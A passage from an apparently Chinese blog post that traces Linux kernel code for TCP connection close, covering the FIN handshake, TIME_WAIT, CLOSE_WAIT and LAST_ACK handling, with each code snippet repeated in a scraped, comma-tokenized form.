创建sock\r\n\t|-sock_map_fd  // 将sock和fd关联\r\n\t\t\t|-sock_attach_fd\r\n\t\t\t\t\t|-init_file(file,...,&socket_file_ops);\r\n\t\t\t\t\t\t\t|-file->f_op = fop; //fop赋值为socket_file_ops\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,socket,(,AF_INET,,, ,SOCK_STREAM,,, ,0,),;,\t,|,-,sock_create,  ,// 创建sock,\t,|,-,sock_map_fd,  ,// 将sock和fd关联,\t\t\t,|,-,sock_attach_fd,\t\t\t\t\t,|,-,init_file,(,file,,,.,.,.,,,&,socket_file_ops,),;,\t\t\t\t\t\t\t,|,-,file,->,f_op, ,=, ,fop,;, ,//fop赋值为socket_file_ops, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,socket_file_ops的实现为:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nstatic const struct file_operations socket_file_ops = {\r\n\t.owner =\tTHIS_MODULE,\r\n\t......\r\n\t// 我们在这里只考虑sock_close\r\n\t.release =\tsock_close,\r\n\t......\r\n};\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,static, ,const, ,struct, ,file_operations ,socket_file_ops, ,=, ,{,\t,.,owner, ,=,\t,THIS_MODULE,,,\t,.,.,.,.,.,.,\t,// 我们在这里只考虑sock_close,\t,.,release, ,=,\t,sock_close,,,\t,.,.,.,.,.,.,},;, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,继续跟踪:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsock_close\r\n\t|-sock_release\r\n\t\t|-sock->ops->release(sock);\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sock_close,\t,|,-,sock_release,\t\t,|,-,sock,->,ops,->,release,(,sock,),;, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在上一篇博客中，我们知道sock->ops为下图所示: ,\n即(在这里我们仅考虑tcp,即sk_prot=tcp_prot):,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ninet_stream_ops->release\r\n\t|-inet_release\r\n\t\t\t|-sk->sk_prot->close(sk, timeout);\r\n\t\t\t\t|-tcp_prot->close(sk, timeout);\r\n\t\t\t\t\t|->tcp_prot.tcp_close\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,inet_stream_ops,->,release,\t,|,-,inet_release,\t\t\t,|,-,sk,->,sk_prot,->,close,(,sk,,, ,timeout,),;,\t\t\t\t,|,-,tcp_prot,->,close,(,sk,,, ,timeout,),;,\t\t\t\t\t,|,->,tcp_prot,.,tcp,_,close, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,关于fd与socket的关系如下图所示:,\n,\n上图中红色线标注的是close(fd)的调用链,\n,tcp_close,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nvoid tcp_close(struct sock *sk, long timeout)\r\n{\r\n\tif (sk->sk_state == TCP_LISTEN) {\r\n\t\t// 如果是listen状态，则直接设为close状态\r\n\t\ttcp_set_state(sk, TCP_CLOSE);\r\n\t}\r\n\t// 清空掉recv.buffer\r\n\t......\r\n\t// SOCK_LINGER选项的处理\r\n\t......\r\n\telse if (tcp_close_state(sk)){\r\n\t\t// tcp_close_state会将sk从established状态变为fin_wait1\r\n\t\t// 发送fin包\r\n\t\ttcp_send_fin(sk);\r\n\t}\r\n\t......\r\n}\r\n\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,void, ,tcp_close,(,struct, ,sock *,sk,,, ,long, ,timeout,),{,\t,if, ,(,sk,->,sk_state, ,==, ,TCP_LISTEN,), ,{,\t\t,// 如果是listen状态，则直接设为close状态,\t\t,tcp_set_state,(,sk,,, ,TCP_CLOSE,),;,\t,},\t,// 清空掉recv.buffer,\t,.,.,.,.,.,.,\t,// SOCK_LINGER选项的处理,\t,.,.,.,.,.,.,\t,else, ,if, ,(,tcp_close_state,(,sk,),),{,\t\t,// tcp_close_state会将sk从established状态变为fin_wait1,\t\t,// 发送fin包,\t\t,tcp_send_fin,(,sk,),;,\t,},\t,.,.,.,.,.,.,}, , ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,四次挥手,\n,现在就是我们的四次挥手环节了，其中上半段的两次挥手下图所示:,\n,\n首先，在tcp_close_state(sk)中已经将状态设置为fin_wait1,并调用tcp_send_fin,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nvoid tcp_send_fin(struct sock *sk)\r\n{\r\n\t......\r\n\t// 这边设置flags为ack和fin\r\n\tTCP_SKB_CB(skb)->flags = (TCPCB_FLAG_ACK | TCPCB_FLAG_FIN);\r\n\t......\r\n\t// 发送fin包，同时关闭nagle\r\n\t__tcp_push_pending_frames(sk, mss_now, TCP_NAGLE_OFF);\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,void, ,tcp_send_fin,(,struct, ,sock *,sk,),{,\t,.,.,.,.,.,.,\t,// 这边设置flags为ack和fin,\t,TCP_SKB_CB,(,skb,),->,flags, ,=, ,(,TCPCB_FLAG_ACK, ,|, ,TCPCB_FLAG_FIN,),;,\t,.,.,.,.,.,.,\t,// 发送fin包，同时关闭nagle,\t,__tcp_push_pending_frames,(,sk,,, ,mss_now,,, ,TCP_NAGLE_OFF,),;,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如上图Step1所示。 接着，主动关闭的这一端等待对端的ACK，如果ACK回来了，就设置TCP状态为FIN_WAIT2,如上图Step2所示,具体代码如下:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ntcp_v4_do_rcv\r\n\t|-tcp_rcv_state_process\r\nint tcp_rcv_state_process(struct sock *sk, struct sk_buff *skb, struct tcphdr *th, unsigned len)\t\r\n{\r\n\t......\r\n\t/* step 5: check the ACK field */\r\n\tif (th->ack) {\r\n\t\t...\r\n\t\tcase TCP_FIN_WAIT1:\r\n\t\t\t// 这处判断是确认此ack是发送Fin包对应的那个ack\r\n\t\t\tif (tp->snd_una == tp->write_seq) {\r\n\t\t\t\t// 设置为FIN_WAIT2状态\r\n\t\t\t\ttcp_set_state(sk, TCP_FIN_WAIT2);\r\n\t\t\t\t......\r\n\t\t\t\t// 设定TCP_FIN_WAIT2定时器，将在tmo时间到期后将状态变迁为TIME_WAIT\r\n\t\t\t\t// 不过是这时候改的已经是inet_timewait_sock了\r\n\t\t\t\ttcp_time_wait(sk, TCP_FIN_WAIT2, tmo);\r\n\t\t\t\t......\r\n\t\t\t}\r\n\t}\r\n\t/* step 7: process the segment text */\r\n\tswitch(sk->sk_state) {\r\n\tcase TCP_FIN_WAIT1:\r\n\tcase TCP_FIN_WAIT2:\r\n\t\t......\r\n\tcase TCP_ESTABLISHED:\r\n\t\ttcp_data_queue(sk, skb);\r\n\t\tqueued = 1;\r\n\t\tbreak;\r\n\t}\r\n\t.....\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,tcp_v4_do_rcv,\t,|,-,tcp_rcv_state_process,int, ,tcp_rcv_state_process,(,struct, ,sock *,sk,,, ,struct, ,sk_buff *,skb,,, ,struct, ,tcphdr *,th,,, ,unsigned, ,len,),\t,{,\t,.,.,.,.,.,.,\t,/* step 5: check the ACK field */,\t,if, ,(,th,->,ack,), ,{,\t\t,.,.,.,\t\t,case, ,TCP_FIN_WAIT1,:,\t\t\t,// 这处判断是确认此ack是发送Fin包对应的那个ack,\t\t\t,if, ,(,tp,->,snd_una, ,==, ,tp,->,write_seq,), ,{,\t\t\t\t,// 设置为FIN_WAIT2状态,\t\t\t\t,tcp_set_state,(,sk,,, ,TCP_FIN_WAIT2,),;,\t\t\t\t,.,.,.,.,.,.,\t\t\t\t,// 设定TCP_FIN_WAIT2定时器，将在tmo时间到期后将状态变迁为TIME_WAIT,\t\t\t\t,// 不过是这时候改的已经是inet_timewait_sock了,\t\t\t\t,tcp_time_wait,(,sk,,, ,TCP_FIN_WAIT2,,, ,tmo,),;,\t\t\t\t,.,.,.,.,.,.,\t\t\t,},\t,},\t,/* step 7: process the segment text */,\t,switch,(,sk,->,sk_state,), ,{,\t,case, ,TCP_FIN_WAIT1,:,\t,case, ,TCP_FIN_WAIT2,:,\t\t,.,.,.,.,.,.,\t,case, ,TCP_ESTABLISHED,:,\t\t,tcp_data_queue,(,sk,,, ,skb,),;,\t\t,queued, ,=, ,1,;,\t\t,break,;,\t,},\t,.,.,.,.,.,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,值的注意的是，从TCP_FIN_WAIT1变迁到TCP_FIN_WAIT2之后，还调用tcp_time_wait设置一个TCP_FIN_WAIT2定时器，在tmo+(2MSL或者基于RTO计算超时)超时后会直接变迁到closed状态(不过此时已经是inet_timewait_sock了）。这个超时时间可以配置,如果是ipv4的话,则可以按照下列配置:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nnet.ipv4.tcp_fin_timeout   \r\n/sbin/sysctl -w net.ipv4.tcp_fin_timeout=30\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,net,.,ipv4,.,tcp_fin_timeout,   ,/,sbin,/,sysctl, ,-,w, ,net,.,ipv4,.,tcp_fin_timeout,=,30, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如下图所示: ,\n有这样一步的原因是防止对端由于种种原因始终没有发送fin,防止一直处于FIN_WAIT2状态。,\n,接着在FIN_WAIT2状态等待对端的FIN，完成后面两次挥手: ,\n由Step1和Step2将状态置为了FIN_WAIT_2，然后接收到对端发送的FIN之后,将会将状态设置为time_wait,如下代码所示:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ntcp_v4_do_rcv\r\n\t|-tcp_rcv_state_process\r\n\t\t|-tcp_data_queue\r\n\t\t\t\t|-tcp_fin\r\nstatic void tcp_fin(struct sk_buff *skb, struct sock *sk, struct tcphdr *th)\r\n{\r\n\tswitch (sk->sk_state) {\r\n\t\t......\t\r\n\t\tcase TCP_FIN_WAIT1:\r\n\t\t\t// 这边是处理同时关闭的情况\r\n\t\t\ttcp_send_ack(sk);\r\n\t\t\ttcp_set_state(sk, TCP_CLOSING);\r\n\t\t\tbreak;\r\n\t\tcase TCP_FIN_WAIT2:\r\n\t\t\t/* Received a FIN -- send ACK and enter TIME_WAIT. */\r\n\t\t\t// 收到FIN之后，发送ACK同时将状态进入TIME_WAIT\r\n\t\t\ttcp_send_ack(sk);\r\n\t\t\ttcp_time_wait(sk, TCP_TIME_WAIT, 0);\r\n\t}\r\n}\t\t   \r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,tcp_v4_do_rcv,\t,|,-,tcp_rcv_state_process,\t\t,|,-,tcp_data_queue,\t\t\t\t,|,-,tcp_fin,static, ,void, ,tcp_fin,(,struct, ,sk_buff *,skb,,, ,struct, ,sock *,sk,,, ,struct, ,tcphdr *,th,),{,\t,switch, ,(,sk,->,sk_state,), ,{,\t\t,.,.,.,.,.,.,\t,\t\t,case, ,TCP_FIN_WAIT1,:,\t\t\t,// 这边是处理同时关闭的情况,\t\t\t,tcp_send_ack,(,sk,),;,\t\t\t,tcp_set_state,(,sk,,, ,TCP_CLOSING,),;,\t\t\t,break,;,\t\t,case, ,TCP_FIN_WAIT2,:,\t\t\t,/* Received a FIN -- send ACK and enter TIME_WAIT. */,\t\t\t,// 收到FIN之后，发送ACK同时将状态进入TIME_WAIT,\t\t\t,tcp_send_ack,(,sk,),;,\t\t\t,tcp_time_wait,(,sk,,, ,TCP_TIME_WAIT,,, ,0,),;,\t,},},\t\t   , ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,time_wait状态时，原socket会被destroy,然后新创建一个inet_timewait_sock,这样就能及时的将原socket使用的资源回收。而inet_timewait_sock被挂入一个bucket中，由 inet_twdr_twcal_tick定时从bucket中将超过(2MSL或者基于RTO计算的时间)的time_wait的实例删除。 我们来看下tcp_time_wait函数,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nvoid tcp_time_wait(struct sock *sk, int state, int timeo)\r\n{\r\n\t// 建立inet_timewait_sock\r\n\ttw = inet_twsk_alloc(sk, state);\r\n\t// 放到bucket的具体位置等待定时器删除\r\n\tinet_twsk_schedule(tw, &tcp_death_row, time,TCP_TIMEWAIT_LEN);\r\n\t// 设置sk状态为TCP_CLOSE,然后回收sk资源\r\n\ttcp_done(sk);\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,void, ,tcp_time_wait,(,struct, ,sock *,sk,,, ,int, ,state,,, ,int, ,timeo,),{,\t,// 建立inet_timewait_sock,\t,tw, ,=, ,inet_twsk_alloc,(,sk,,, ,state,),;,\t,// 放到bucket的具体位置等待定时器删除,\t,inet_twsk_schedule,(,tw,,, ,&,tcp_death_row,,, ,time,,,TCP_TIMEWAIT_LEN,),;,\t,// 设置sk状态为TCP_CLOSE,然后回收sk资源,\t,tcp_done,(,sk,),;,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,具体的定时器操作函数为inet_twdr_twcal_tick,这边就不做描述了,\n,被动关闭,\n,close_wait,\n,在tcp的socket时候，如果是established状态，接收到了对端的FIN,则是被动关闭状态,会进入close_wait状态,如下图Step1所示:,\n,\n具体代码如下所示:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ntcp_rcv_state_process\r\n\t|-tcp_data_queue\r\nstatic void tcp_data_queue(struct sock *sk, struct sk_buff *skb)\r\n{\r\n\t...\r\n\tif (th->fin)\r\n\t\ttcp_fin(skb, sk, th);\r\n\t...\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,tcp_rcv_state_process,\t,|,-,tcp_data_queue,static, ,void, ,tcp_data_queue,(,struct, ,sock *,sk,,, ,struct, ,sk_buff *,skb,),{,\t,.,.,.,\t,if, ,(,th,->,fin,),\t\t,tcp_fin,(,skb,,, ,sk,,, ,th,),;,\t,.,.,.,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我们再看下tcp_fin,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nstatic void tcp_fin(struct sk_buff *skb, struct sock *sk, struct tcphdr *th)\r\n{\r\n\t......\r\n\t// 这一句表明当前socket有ack需要发送\r\n\tinet_csk_schedule_ack(sk);\r\n\t......\r\n\tswitch (sk->sk_state) {\r\n\t\t\tcase TCP_SYN_RECV:\r\n\t\t\tcase TCP_ESTABLISHED:\r\n\t\t\t\t/* Move to CLOSE_WAIT */\r\n\t\t\t\t// 状态设置程close_wait状态\r\n\t\t\t\ttcp_set_state(sk, TCP_CLOSE_WAIT);\r\n\t\t\t\t// 这一句表明，当前fin可以延迟发送\r\n\t\t\t\t// 即和后面的数据一起发送或者定时器到时后发送\r\n\t\t\t\tinet_csk(sk)->icsk_ack.pingpong = 1;\r\n\t\t\t\tbreak;\r\n\t}\r\n\t......\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,static, ,void, ,tcp_fin,(,struct, ,sk_buff *,skb,,, ,struct, ,sock *,sk,,, ,struct, ,tcphdr *,th,),{,\t,.,.,.,.,.,.,\t,// 这一句表明当前socket有ack需要发送,\t,inet_csk_schedule_ack,(,sk,),;,\t,.,.,.,.,.,.,\t,switch, ,(,sk,->,sk_state,), ,{,\t\t\t,case, ,TCP_SYN_RECV,:,\t\t\t,case, ,TCP_ESTABLISHED,:,\t\t\t\t,/* Move to CLOSE_WAIT */,\t\t\t\t,// 状态设置程close_wait状态,\t\t\t\t,tcp_set_state,(,sk,,, ,TCP_CLOSE_WAIT,),;,\t\t\t\t,// 这一句表明，当前fin可以延迟发送,\t\t\t\t,// 即和后面的数据一起发送或者定时器到时后发送,\t\t\t\t,inet_csk,(,sk,),->,icsk_ack,.,pingpong, ,=, ,1,;,\t\t\t\t,break,;,\t,},\t,.,.,.,.,.,.,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这边有意思的点是，收到对端的fin之后并不会立即发送ack告知对端收到了，而是等有数据携带一块发送,或者等携带重传定时器到期后发送ack。,\n,如果对端关闭了，应用端在read的时候得到的返回值是0,此时就应该手动调用close去关闭连接,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nif(recv(sockfd, buf, MAXLINE,0) == 0){\r\n\tclose(sockfd)\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,if,(,recv,(,sockfd,,, ,buf,,, ,MAXLINE,,,0,), ,==, ,0,),{,\t,close,(,sockfd,),}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我们看下recv是怎么处理fin包，从而返回0的,上一篇博客可知，recv最后调用tcp_rcvmsg,由于比较复杂，我们分两段来看:,\ntcp_recvmsg第一段,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n\t\t......\r\n\t\t// 从接收队列里面获取一个sk_buffer\r\n\t\tskb = skb_peek(&sk->sk_receive_queue);\r\n\t\tdo {\r\n\t\t\t// 如果已经没有数据，直接跳出读取循环，返回0\r\n\t\t\tif (!skb)\r\n\t\t\t\tbreak;\r\n\t\t\t......\r\n\t\t\t// *seq表示已经读到多少seq\r\n\t\t\t// TCP_SKB_CB(skb)->seq表示当前sk_buffer的起始seq\r\n\t\t\t// offset即是在当前sk_buffer中已经读取的长度\r\n\t\t\toffset = *seq - TCP_SKB_CB(skb)->seq;\r\n\t\t\t// syn处理 \r\n\t\t\tif (tcp_hdr(skb)->syn)\r\n\t\t\t\toffset--;\r\n\t\t\t// 此处判断表示，当前skb还有数据可读，跳转found_ok_skb\r\n\t\t\tif (offset < skb->len)\r\n\t\t\t\tgoto found_ok_skb;\r\n\t\t\t// 处理fin包的情况\t\r\n\t\t\t// offset == skb->len,跳转到found_fin_ok然后跳出外面的大循环\r\n\t\t\t// 并返回0\r\n\t\t\tif (tcp_hdr(skb)->fin)\r\n\t\t\t\tgoto found_fin_ok;\r\n\t\t\tBUG_TRAP(flags & MSG_PEEK);\r\n\t\t\tskb = skb->next;\r\n\t\t} while (skb != (struct sk_buff *)&sk->sk_receive_queue);\r\n\t\t......\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,\t\t,.,.,.,.,.,.,\t\t,// 从接收队列里面获取一个sk_buffer,\t\t,skb, ,=, ,skb_peek,(,&,sk,->,sk_receive_queue,),;,\t\t,do, ,{,\t\t\t,// 如果已经没有数据，直接跳出读取循环，返回0,\t\t\t,if, ,(,!,skb,),\t\t\t\t,break,;,\t\t\t,.,.,.,.,.,.,\t\t\t,// *seq表示已经读到多少seq,\t\t\t,// TCP_SKB_CB(skb)->seq表示当前sk_buffer的起始seq,\t\t\t,// offset即是在当前sk_buffer中已经读取的长度,\t\t\t,offset, ,=, ,*,seq, ,-, ,TCP_SKB_CB,(,skb,),->,seq,;,\t\t\t,// syn处理 ,\t\t\t,if, ,(,tcp_hdr,(,skb,),->,syn,),\t\t\t\t,offset,--,;,\t\t\t,// 此处判断表示，当前skb还有数据可读，跳转found_ok_skb,\t\t\t,if, ,(,offset, ,<, ,skb,->,len,),\t\t\t\t,goto, ,found_ok_skb,;,\t\t\t,// 处理fin包的情况\t,\t\t\t,// offset == skb->len,跳转到found_fin_ok然后跳出外面的大循环,\t\t\t,// 并返回0,\t\t\t,if, ,(,tcp_hdr,(,skb,),->,fin,),\t\t\t\t,goto, ,found_fin_ok,;,\t\t\t,BUG_TRAP,(,flags, ,&, ,MSG_PEEK,),;,\t\t\t,skb, ,=, ,skb,->,next,;,\t\t,}, ,while, ,(,skb, ,!=, ,(,struct, ,sk_buff *,),&,sk,->,sk_receive_queue,),;,\t\t,.,.,.,.,.,., ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上面代码的处理过程如下图所示: ,\n我们看下tcp_recmsg的第二段:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfound_ok_skb:\r\n\t\t// tcp已读seq更新\r\n\t\t*seq += used;\r\n\t\t// 这次读取的数量更新\r\n\t\tcopied += used;\r\n\t\t// 如果还没有读到当前sk_buffer的尽头，则不检测fin标识\r\n\t\tif (used + offset < skb->len)\r\n\t\t\tcontinue;\r\n\t\t// 如果发现当前skb有fin标识，去found_fin_ok\r\n\t\tif (tcp_hdr(skb)->fin)\r\n\t\t\tgoto found_fin_ok;\r\n\t\t......\r\nfound_fin_ok:\r\n\t\t/* Process the FIN. */\r\n\t\t// tcp已读seq++\r\n\t\t++*seq;\r\n\t\t...\r\n\t\tbreak;\r\n} while(len > 0);\t\t\t\t\t\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,found_ok_skb,:,\t\t,// tcp已读seq更新,\t\t,*,seq, ,+=, ,used,;,\t\t,// 这次读取的数量更新,\t\t,copied, ,+=, ,used,;,\t\t,// 如果还没有读到当前sk_buffer的尽头，则不检测fin标识,\t\t,if, ,(,used, ,+, ,offset, ,<, ,skb,->,len,),\t\t\t,continue,;,\t\t,// 如果发现当前skb有fin标识，去found_fin_ok,\t\t,if, ,(,tcp_hdr,(,skb,),->,fin,),\t\t\t,goto, ,found_fin_ok,;,\t\t,.,.,.,.,.,.,found_fin_ok,:,\t\t,/* Process the FIN. */,\t\t,// tcp已读seq++,\t\t,++,*,seq,;,\t\t,.,.,.,\t\t,break,;,}, ,while,(,len, ,>, ,0,),;,\t\t\t\t\t, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,由上面代码可知，一旦当前skb读完了而且携带有fin标识，则不管有没有读到用户期望的字节数量都会返回已读到的字节数。下一次再读取的时候则在刚才描述的tcp_rcvmsg上半段直接不读取任何数据再跳转到found_fin_ok并返回0。这样应用就能感知到对端已经关闭了。 如下图所示:,\n,\n,last_ack,\n,应用层在发现对端关闭之后已经是close_wait状态，这时候再调用close的话，会将状态改为last_ack状态，并发送本端的fin,如下代码所示:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nvoid tcp_close(struct sock *sk, long timeout)\r\n{\r\n\t......\r\n\telse if (tcp_close_state(sk)){\r\n\t\t// tcp_close_state会将sk从close_wait状态变为last_ack\r\n\t\t// 发送fin包\r\n\t\ttcp_send_fin(sk);\r\n\t}\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,void, ,tcp_close,(,struct, ,sock *,sk,,, ,long, ,timeout,),{,\t,.,.,.,.,.,.,\t,else, ,if, ,(,tcp_close_state,(,sk,),),{,\t\t,// tcp_close_state会将sk从close_wait状态变为last_ack,\t\t,// 发送fin包,\t\t,tcp_send_fin,(,sk,),;,\t,},}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在接收到主动关闭端的last_ack之后，则调用tcp_done(sk)设置sk为tcp_closed状态，并回收sk的资源,如下代码所示:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ntcp_v4_do_rcv\r\n\t|-tcp_rcv_state_process\r\nint tcp_rcv_state_process(struct sock *sk, struct sk_buff *skb, struct tcphdr *th, unsigned len)\t\r\n{\r\n\t......\r\n\t/* step 5: check the ACK field */\r\n\tif (th->ack) {\r\n\t\t...\r\n\t\tcase TCP_LAST_ACK:\r\n\t\t\t// 这处判断是确认此ack是发送Fin包对应的那个ack\r\n\t\t\tif (tp->snd_una == tp->write_seq) {\r\n\t\t\t\t\ttcp_update_metrics(sk);\r\n\t\t\t\t\t// 设置socket为closed，并回收socket的资源\r\n\t\t\t\t\ttcp_done(sk);\r\n\t\t\t\t\tgoto discard;\r\n\t\t\t}\r\n\t\t...\r\n\t}\r\n}\t\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,tcp_v4_do_rcv,\t,|,-,tcp_rcv_state_process,int, ,tcp_rcv_state_process,(,struct, ,sock *,sk,,, ,struct, ,sk_buff *,skb,,, ,struct, ,tcphdr *,th,,, ,unsigned, ,len,),\t,{,\t,.,.,.,.,.,.,\t,/* step 5: check the ACK field */,\t,if, ,(,th,->,ack,), ,{,\t\t,.,.,.,\t\t,case, ,TCP_LAST_ACK,:,\t\t\t,// 这处判断是确认此ack是发送Fin包对应的那个ack,\t\t\t,if, ,(,tp,->,snd_una, ,==, ,tp,->,write_seq,), ,{,\t\t\t\t\t,tcp_update_metrics,(,sk,),;,\t\t\t\t\t,// 设置socket为closed，并回收socket的资源,\t\t\t\t\t,tcp_done,(,sk,),;,\t\t\t\t\t,goto, ,discard,;,\t\t\t,},\t\t,.,.,.,\t,},},\t, 